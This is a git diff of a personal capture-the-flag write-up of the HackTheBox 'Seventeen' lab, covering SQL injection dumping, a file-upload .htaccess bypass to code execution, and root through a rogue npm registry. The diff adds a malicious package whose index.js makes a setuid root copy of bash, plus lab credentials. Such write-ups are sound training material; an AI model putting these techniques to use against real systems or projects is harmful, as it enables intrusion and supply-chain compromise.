@@ -1,7 +1,7 @@
 # Seventeen Helped-through
 
 Name: Seventeen
-Date:  17/12/2022
+Date:  17/12/2022 - 23/2/2023
 Difficulty: Hard  
 Goals: 
 - Learn different methodological points to assimilate
@@ -12,6 +12,11 @@ Goals:
 - Share some dadamnmayne 
 Learnt:
 - These are really good for comparitative and iterative "I made X mistake Y months ago - brain reinforced lesson learnt"
+- Node.js 
+- Bad NPM package
+- NPM and dev package management
+- Docker 
+- Infrastructure
 
 Being a detirministically isolated in this wide world and in the cyber world, being that it is Christmas and I am on the enternal get good continuation one way is to learn from other very much unlike yourself. [dadamnmayne](https://www.youtube.com/@dadamnmayne) is awesome and underrated - and very different from myself. He comes from a strong Blue team background, is a manager, has OSCP make stellar content and another awesome [Black Guy at Security Conferences - awesome talk by Joseph McCray](https://www.youtube.com/watch?v=-AkUutmXwUI). I have seen he post some insightful post on THM forums - he is definately someone that will age well. In it also being Christmas and I want a wide scope of methodlogical hows and whys [Can We Root 'Seventeen' from HTB in Under 122 Minutes? | No Writeup Run](https://www.youtube.com/watch?v=u6Bpz7IWYFI), will be both chill and educational. I am poshing through tough weeks stablisers on till I am back at peak to find that next one - this Youtube channel is awesome and very underrated. Tomorrow I will be doing the Snowscan (top 0.9% of HTB on [[Blackfield-Helped-Through]], but tipsy and final starting to feel festive I write to dedicating this written piece to [dadamnmayne](https://www.youtube.com/@dadamnmayne) and his family all the best for the future.  
 
@@ -74,7 +79,7 @@ Parametres check - LFI, RFI, Command Injection, SQLinjection
 Already there is a CVE for Examination Management System 2021
 ![](alreadycved.png)
 Searchsploits output
-![](searchsploittheexammanagement.png)
+![1080](searchsploittheexammanagement.png)
 
 The admin panel is disabled
 ![](disabledadmin.png)
@@ -83,10 +88,10 @@ Testing the parametre in the exploitdb exploit - not verified
 ![](errontheexploitdb.png)
 
 Recon the sqli in the background.
-![](savethedrequestedandsqlmap.png)
+![1080](savethedrequestedandsqlmap.png)
 Retried adding great risk and level flags than the default.
 
-[[pypiserver-detect-http___exams.seventeen.htb]] detected on exams subdomain - https://pypi.org/project/pypiserver/ - Minimal PyPI server for uploading & downloading packages with pip/easy_install. Although it is irrelevant as second peaking at writeup for the sqlmap syntax. I cringed a tad at this one, which is good for me as I feel that with my time pressure not being that of "being like snowscan levels of speed" I flailed around alot more to learn my flaw. To paste over this with health dose of positivity I remember being at these points where the actually issue is the google dork and searching in the right places (that are not write ups). Very OSCP like issue you run into of PG boxes or during OSCP stuff is there are 5 to 6 *close enough* exploits amongst lots of similiar named exploits to weed out find the correct one or a couple where one works if you edit a small part of the script. One thing I did to better myself was to look up the exploits as collection or group rather than b-line, which is not nessacarily a mistake just an issue that comes from search enigine usage where you need to think more like a engineer - I can see the exact size of the bolt that I need to untighten becuase it is obscucated by darkness, so instead pulling the spannel that some random person standing around on there phone said, pick out the greater than one amount of spanners to look over and try each if required - and not end up beating yourself up like and with emotional a spanner because you could have "just googled harder..."    
+[[pypiserver-detect-http___exams.seventeen.htb]] detected on exams subdomain - https://pypi.org/project/pypiserver/ - Minimal PyPI server for uploading & downloading packages with pip/easy_install. Although it is irrelevant as second peaking at writeup for the sqlmap syntax. I cringed a tad at this one, which is good for me as I feel that with my time pressure not being that of "being like snowscan levels of speed" I flailed around alot more to learn my flaw. To paste over this with health dose of positivity I remember being at these points where the actually issue is the google dork and searching in the right places (that are not write ups). Very OSCP like issue you run into of PG boxes or during OSCP stuff is there are 5 to 6 *close enough* exploits amongst lots of similiar named exploits to weed out find the correct one or a couple where one works if you edit a small part of the script. One thing I did to better myself was to look up the exploits as collection or group rather than b-line, which is not necessarily a mistake just an issue that comes from search enigine usage where you need to think more like a engineer - I can see the exact size of the bolt that I need to untighten becuase it is obscucated by darkness, so instead pulling the spannel that some random person standing around on there phone said, pick out the greater than one amount of spanners to look over and try each if required - and not end up beating yourself up like and with emotional a spanner because you could have "just googled harder..."    
 
 Sad directory busting
 ![](sadferox.png)
@@ -155,7 +160,7 @@ Smith : 184fe92824bea12486ae9a56050228ee
 ```
 
 A redumping of the databases got me the other credentials
-![](redumpaning.png)
+![1080](redumpaning.png)
 
 | stud_id | yr | gender | stud_no | lastname | password | firstname |
 | --- | --- | --- | --- | --- | --- | --- | ---|
@@ -166,16 +171,14 @@ A redumping of the databases got me the other credentials
 
 31234 : autodestruction
 
-![](fileuploadformauthed.png)
+![1080](fileuploadformauthed.png)
 
 Download the pdf
-![](mastermailer.png)
+![1080](mastermailer.png)
 
 ## Foothold
 
 Ippsec point to the intend CVE route and his route of learning some php and file upload vulnerability with his route so I will do both. In the thrust of @malwarejake two is one and one is none. 
-
-https://www.youtube.com/watch?v=U-2nI6wSPOE&t=46s - 27:12
 
 Returning to this box again to finish it and state the HackTheBox [Json](https://www.youtube.com/watch?v=zqJNOqohWMQ) helpthrough is going to be my damnmanye understand others Helped-Through as I going to dealing with alot of json related Azure stuff, also found Azure Pentesting from Unknown Artist who seemed to be going through a burnout phase. Regardelss of how rough the alst three months have been as to the expectation I had. I think that really improved in the greater understanding of being a hacker even with the number of boxes or OSCP related triumphs and shortcomings that made my restrategise for Azure System administrator by the and of 2022 and maybe OSCP also. I will see. My progress was made in strife as I have no mentors and I am trying my hardest to use every learning strategy, feedback mechanism and challenge myself for quality time to get results. 
 
@@ -188,13 +191,13 @@ As explained above regarding trying to find a knwon file within a unknown direct
 Ippsec Mitigation 
 - md5sum or shasum the files and store them as the \*-sum string for pseudo random filenames, which remove control over the extension. 
 - Disable PHP wrappers, file could be archived as .zip, but then unzipped PHP wrappers with the extension then useable 
-​- Complexify the suming as function `md5($data_uploaded, $store_id, stud_no, $filename)`
+- Complexify the suming as function `md5($data_uploaded, $store_id, stud_no, $filename)`
 	- `$data_uploaded`, `$store_id` - like a Salt
 	- `$stud_no`, `$filename` - prevent collision with other files
 
 [Source Code](https://www.sourcecodester.com/php/14155/school-file-management-system.html)
 
-![](ippsecroute-savefilephp.png)
+![1080](ippsecroute-savefilephp.png)
 Create a directory of the stud_no if does not exist and copy file in to the directory
 
 1. Try upload .php file
@@ -206,11 +209,11 @@ Create a directory of the stud_no if does not exist and copy file in to the dire
 
 ![](useyourownhtaccess.png)
 And we have code execution...Ippsec Rocks!
-![](nvmshellid.png)
+![1080](nvmshellid.png)
 
 Another way would be to change the stud_no, because the .htaccess only would cover a set directory. 
 
-![](burpproblems.png)
+![1080](burpproblems.png)
 
 It seems like it may have patched out the unintended route... sort of, it is deletign extra directories created, but you can still get a reverse shell. I went back as I remember encoded payload are a must try for me these days. 
 
@@ -236,7 +239,7 @@ Went back to the video before doing my own checks just to see if there are more 
 ![](seemspatched.png)
 They patched the box. The hostname is also indicator of being in docker
 
-Ippsec filesystem knownlegde is awesome, but regardless -
+Ippsec filesystem knownledge is awesome, but regardless -
 
 ```bash
 find . -type d -name *onf* 2>/dev/null
@@ -478,25 +481,35 @@ I was not really wrong I did not know how npm pulled packages. Ippsec hit my rec
 # Pull the latest version
 sudo docker pull verdaccio/verdaccio
 # Run -it sudo tty --rm to delete when done, bind port to host
-sudo docker run -it --rm -p 4873:4873 verdaccio/verdaccio
+sudo docker run -it --rm --name verdaccio -p 4873:4873 -e 'VERDACCIO_PUBLIC_URL=http://10.10.14.43' verdaccio/verdaccio
+# Update auth and flag that exists for legacy authentication 
+nmp adduser --registry http://10.10.14.43 --auth-type=legacy
+# cat ~/.npmrc
+//10.10.14.43:4873/:_authToken="sRfm658flJcUvA3n56/edw=="
+# Initialise a MAlicious NPM Package
+npm init 
+# Version > target npm 
+# make index.js
+require("child_process").exec("chown root:root /tmp/shell;chmod 4755 /tmp/shell")
+npm login --registry http://10.10.14.43:4873 --auth-type=legacy
+npm publish --registry http://10.10.14.43:4873
 # Target
-nmp adduser --registery http://10.10.14.43
-
+# update .npmrc 
+sed -i 's/127.0.0.1/10.10.14.43/g' /home/kavi/.npmrc
+# Copy bash for setuid 
+cp /bin/bash /tmp/shell
 ```
+[Verdaccio Documentation](https://verdaccio.org/docs/setup-npm)
 
+Kavi's password `IhateMathematics123#`
 
+![](hurrayfinally.png)
 
-
+![1080](root.png)
 
 ## Beyond Root
 
-Cleanup
-```bash
-sed -i 's/$IP/127.0.0.1/g' /home/kavi/.npmrc
-
-```
-
-https://0xdf.gitlab.io/2022/09/24/htb-seventeen.html#box-info
+Read [0xdf](https://0xdf.gitlab.io/2022/09/24/htb-seventeen.html#box-info)
 
 
 
